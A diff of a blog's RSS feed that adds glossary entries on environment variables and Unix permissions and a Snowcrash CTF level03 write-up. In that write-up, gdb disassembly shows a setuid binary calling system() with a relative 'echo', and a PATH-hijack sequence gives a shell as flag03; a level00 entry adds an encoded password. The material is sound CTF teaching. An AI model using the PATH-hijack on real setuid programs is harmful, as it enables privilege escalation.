@@ -6,8 +6,195 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Tue, 28 Jul 2020 22:10:15 +0200</lastBuildDate>
+        <lastBuildDate>Sun, 02 Aug 2020 17:02:58 +0200</lastBuildDate>
         <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>What is Environment Table</title>
+            <link>/posts/glossary/env_table/</link>
+            <pubDate>Sun, 02 Aug 2020 17:02:58 +0200</pubDate>
+            
+            <guid>/posts/glossary/env_table/</guid>
+            <description>An Environment Table is a table that is accessible by each process
+Some Environment variable to know about    name description     PATH used to list each directory to search for binary   HOME a directory to be consider as the home directory of the current user   PWD the current working directory    Source  wikipedia  </description>
+            <content type="html"><![CDATA[<p>An <strong>Environment Table</strong> is a table that is accessible by each process</p>
+<h2 id="some-environment-variable-to-know-about">Some Environment variable to know about</h2>
+<table>
+<thead>
+<tr>
+<th><strong>name</strong></th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>PATH</strong></td>
+<td>used to list each directory to search for binary</td>
+</tr>
+<tr>
+<td><strong>HOME</strong></td>
+<td>a directory to be consider as the home directory of the current user</td>
+</tr>
+<tr>
+<td><strong>PWD</strong></td>
+<td>the current working directory</td>
+</tr>
+</tbody>
+</table>
+<h2 id="source">Source</h2>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/Environment_variable">wikipedia</a></li>
+</ul>
+]]></content>
+        </item>
+        
+        <item>
+            <title>What is File Permission</title>
+            <link>/posts/glossary/file_permission/</link>
+            <pubDate>Sun, 02 Aug 2020 17:02:49 +0200</pubDate>
+            
+            <guid>/posts/glossary/file_permission/</guid>
+            <description>Each file as his own permission set.
+It allow to
+ control the ability of the users to view, change, navigate, and execute the contents of the file system
+ Notation for Unix system permission can be see in its symbolic notation using ls -l
+$ ls -l total 16 -rw-rw-r-- 1 level03 level03 0 Aug 2 17:22 foo with ls -l the 1st column is used to represent the file type and his permission.</description>
+            <content type="html"><![CDATA[<p>Each file as his own permission set.<br>
+It allow to</p>
+<blockquote>
+<p>control the ability of the users to view, change, navigate, and execute the contents of the file system</p>
+</blockquote>
+<h2 id="notation-for-unix-system">Notation for Unix system</h2>
+<p>permission can be see in its symbolic notation using <code>ls -l</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ls -l
+total <span style="color:#ae81ff">16</span>
+-rw-rw-r-- <span style="color:#ae81ff">1</span> level03 level03    <span style="color:#ae81ff">0</span> Aug  <span style="color:#ae81ff">2</span> 17:22 foo
+</code></pre></div><p>with <code>ls -l</code> the 1st column is used to represent the file type and his permission.</p>
+<pre><code>[-][rw-rw-r--]
+ ^  ^
+ │  │
+ │  └─ file permission
+ └─ file type
+</code></pre><p>the file permission group is composed of 3 triad each one represented one group:<br>
+<code>User</code> / <code>Group</code> / <code>Other</code></p>
+<pre><code>[rw-][rw-][r--]
+ ^    ^    ^
+ │    │    └─ Other
+ │    └─ Group
+ └─ User
+</code></pre><table>
+<thead>
+<tr>
+<th>Letter</th>
+<th>Location</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>r</td>
+<td>1st letter of each triad</td>
+<td>allow the triad&rsquo;s group to <strong>READ</strong> the file</td>
+</tr>
+<tr>
+<td>w</td>
+<td>2nd letter of each triad</td>
+<td>allow the triad&rsquo;s group to <strong>MODIFY</strong> the file</td>
+</tr>
+<tr>
+<td>x</td>
+<td>3rd letter of each triad</td>
+<td>allow the triad&rsquo;s group to <strong>EXECUTE</strong> the file</td>
+</tr>
+<tr>
+<td>s</td>
+<td>3rd letter of <code>User</code> triad</td>
+<td>allow the user to run the file with the system permissions of the <strong>OWNER</strong></td>
+</tr>
+<tr>
+<td>s</td>
+<td>3rd letter of <code>Group</code> triad</td>
+<td>allow the user to run the file with the system permissions of the <strong>GROUP</strong></td>
+</tr>
+<tr>
+<td>t</td>
+<td>3rd letter of <code>Other</code> triad</td>
+<td>only the <strong>owner</strong> or <strong>root</strong> can <strong>RENAME</strong> or <strong>DELETE</strong> the file</td>
+</tr>
+<tr>
+<td>S</td>
+<td>3rd letter of <code>User</code> / <code>GROUP</code> triad</td>
+<td>like <code>s</code>, but the executable bit is disabled</td>
+</tr>
+<tr>
+<td>T</td>
+<td>3rd letter of <code>Other</code> triad</td>
+<td>like <code>t</code>, but the executable bit is disabled</td>
+</tr>
+<tr>
+<td>-</td>
+<td>any</td>
+<td>the corresponding permission is disabled</td>
+</tr>
+</tbody>
+</table>
+<p>with our previous example <code>foo</code> give the following permission:</p>
+<ul>
+<li>for the owner of the file to <strong>READ</strong> and <strong>WRITE</strong></li>
+<li>for the group to <strong>READ</strong> and <strong>WRITE</strong></li>
+<li>and for the rest to access the file has <strong>READONLY</strong></li>
+</ul>
+<h2 id="source">Source</h2>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/File_system_permissions">file permission - wiki</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Setuid">Setuid &amp; Setgid - wiki</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Sticky_bit">Sticky bit - wiki</a></li>
+</ul>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Snowcrash - Level03</title>
+            <link>/posts/snowcrash/level03/</link>
+            <pubDate>Sun, 02 Aug 2020 15:06:27 +0200</pubDate>
+            
+            <guid>/posts/snowcrash/level03/</guid>
+            <description>On the Home directory of level03 we have an executable file with the setuid file permission set
+$ ls -l total 12 -rwsr-sr-x 1 flag03 level03 8627 Mar 5 2016 level03 Analyzing level03 By using the debugger gdb, we can disassemble level03 and inspect his ASM code.
+$ gdb level03 -q Reading symbols from level03...done. Dump of assembler code for function main: (gdb) disas main ... 0x080484f7 &amp;lt;+83&amp;gt;:	mov DWORD PTR [esp],0x80485e0 0x080484fe &amp;lt;+90&amp;gt;:	call 0x80483b0 &amp;lt;system@plt&amp;gt; 0x08048503 &amp;lt;+95&amp;gt;:	leave 0x08048504 &amp;lt;+96&amp;gt;:	ret End of assembler dump.</description>
+            <content type="html"><![CDATA[<p>On the Home directory of <code>level03</code> we have an executable file with the <strong>setuid</strong> <a href="/posts/glossary/file_permission">file permission</a> set</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ls -l
+total <span style="color:#ae81ff">12</span>
+-rwsr-sr-x <span style="color:#ae81ff">1</span> flag03 level03 <span style="color:#ae81ff">8627</span> Mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2016</span> level03
+</code></pre></div><h2 id="analyzing-level03">Analyzing level03</h2>
+<p>By using the debugger <code>gdb</code>, we can disassemble <code>level03</code> and inspect his <strong>ASM</strong> code.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ gdb level03 -q
+Reading symbols from level03...done.
+Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
+<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disas main
+   ...
+   0x080484f7 &lt;+83&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp<span style="color:#f92672">]</span>,0x80485e0
+   0x080484fe &lt;+90&gt;:	call   0x80483b0 &lt;system@plt&gt;
+   0x08048503 &lt;+95&gt;:	leave
+   0x08048504 &lt;+96&gt;:	ret
+End of assembler dump.
+<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/s 0x80485e0
+0x80485e0:	<span style="color:#e6db74">&#34;/usr/bin/env echo Exploit me&#34;</span>
+</code></pre></div><p>We jump to what we are interesting in, the <code>system</code> call.<br>
+Put it together, we get the following line in <code>C</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">system(<span style="color:#e6db74">&#34;/usr/bin/env echo Exploit me&#34;</span>);
+</code></pre></div><h2 id="exploiting-the-executable">Exploiting the executable</h2>
+<p>As you can see, we can exploit the <code>system</code> call and making it execute arbitrary code by modifying the <code>PATH</code> <a href="/posts/glossary/env_table">env variable</a>.</p>
+<p>With the following example, I manage the execute a shell with the right of <code>flag03</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ mkdir /tmp/03
+$ cd /tmp/03
+$ echo <span style="color:#e6db74">&#34;/bin/sh&#34;</span> &gt; echo
+$ cd
+$ PATH<span style="color:#f92672">=</span>/tmp/03:$PATH ./level03 <span style="color:#75715e"># We add our dir in first of PATH, so our echo who is executed</span>
+$ whoami
+flag03
+</code></pre></div>]]></content>
+        </item>
         
         <item>
             <title>What is Rainbow table</title>
@@ -175,22 +362,27 @@ Crazy right ?</p>
             
             <guid>/posts/snowcrash/level00/</guid>
             <description>on connection to level00, we arrive on a empty home directory
-An interesting file because we don&amp;rsquo;t have any file present in the home directory, we search for file related to the user flag00 our target.
+An interesting file because we don&amp;rsquo;t have any file present in the home directory, we search for file related to the user flag00, our target.
 first we search for with flag00 as owner
-$ find / -user flag00 2&amp;gt;/dev/null /usr/sbin/john /rofs/usr/sbin/john Cesar, my old friend The file /usr/sbin/john contain a odd string but its not our password. The filename john refer to a tool to find weak passwords of your users.</description>
+$ find / -user flag00 2&amp;gt;/dev/null /usr/sbin/john /rofs/usr/sbin/john Cesar, my old friend The file /usr/sbin/john contain a odd string but its not our password.
+$ cat /usr/sbin/john cdiiddwpgswtgt  The filename john refer to a tool to find weak passwords of your users.</description>
             <content type="html"><![CDATA[<p>on connection to level00, we arrive on a empty home directory</p>
 <h2 id="an-interesting-file">An interesting file</h2>
-<p>because we don&rsquo;t have any file present in the home directory, we search for file related to the user <strong>flag00</strong> our target.</p>
+<p>because we don&rsquo;t have any file present in the home directory, we search for file related to the user <strong>flag00</strong>, our target.</p>
 <p>first we search for with <strong>flag00</strong> as owner</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ find / -user flag00 2&gt;/dev/null
 /usr/sbin/john
 /rofs/usr/sbin/john
 </code></pre></div><h2 id="cesar-my-old-friend">Cesar, my old friend</h2>
-<p>The file <code>/usr/sbin/john</code> contain a odd string but its not our password.
-The filename <code>john</code> refer to <em>a tool to find weak passwords of your users</em>.</p>
-<p>So the string we found must be decoded first, I go to <a href="https://www.dcode.fr/chiffre-rot">dcode root-n</a> to try the <a href="/posts/glossary/root_permutation">root permutation</a> method.</p>
+<p>The file <code>/usr/sbin/john</code> contain a odd string but its not our password.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cat /usr/sbin/john
+cdiiddwpgswtgt
+</code></pre></div><blockquote>
+<p>The filename <code>john</code> refer to <em>a tool to find weak passwords of your users</em>.</p>
+</blockquote>
+<p>So the string we found must be decoded first, I go to <a href="https://www.dcode.fr/chiffre-rot">dcode root-n</a> to decode the string using the <a href="/posts/glossary/root_permutation">root permutation</a> method.</p>
 <p>With an automatic decode we found an interesting string.</p>
-<p>We connect to <strong>flag00</strong> using <code>su flag00</code> with the string, and voila we can get the flag</p>
+<p>We connect to <strong>flag00</strong> using <code>su flag00</code> with the decoded string, and voila we can get the flag</p>
 <h2 id="source">Source</h2>
 <ul>
 <li><a href="https://www.dcode.fr">dcode.fr</a></li>
@@ -206,15 +398,15 @@ The filename <code>john</code> refer to <em>a tool to find weak passwords of you
             <guid>/posts/snowcrash/</guid>
             <description>Introduction Snowcrash is a VM in the style of a CTF.
 You have 14 level to complete and get each flags
-Summary  Level00: you lost something ? Level01 Level02 Level03 Level04 Level05 Level06 Level07 Level08 Level09 Level10 Level11 Level12 Level13 Level14  </description>
+Summary  Level00: you lost something ? Level01: john, can you give me the flag ? Level02: I want a soda with my shark. Level03 Level04 Level05 Level06 Level07 Level08 Level09 Level10 Level11 Level12 Level13 Level14  </description>
             <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
 <p>Snowcrash is a <a href="/posts/glossary/vm">VM</a> in the style of a <a href="/posts/glossary/ctf">CTF</a>.</p>
 <p>You have 14 level to complete and get each flags</p>
 <h2 id="summary">Summary</h2>
 <ul>
 <li><a href="/posts/snowcrash/level00">Level00</a>: you lost something ?</li>
-<li><a href="/posts/snowcrash/level01">Level01</a></li>
-<li><a href="/posts/snowcrash/level02">Level02</a></li>
+<li><a href="/posts/snowcrash/level01">Level01</a>: john, can you give me the flag ?</li>
+<li><a href="/posts/snowcrash/level02">Level02</a>: I want a soda with my shark.</li>
 <li><a href="/posts/snowcrash/level03">Level03</a></li>
 <li><a href="/posts/snowcrash/level04">Level04</a></li>
 <li><a href="/posts/snowcrash/level05">Level05</a></li>
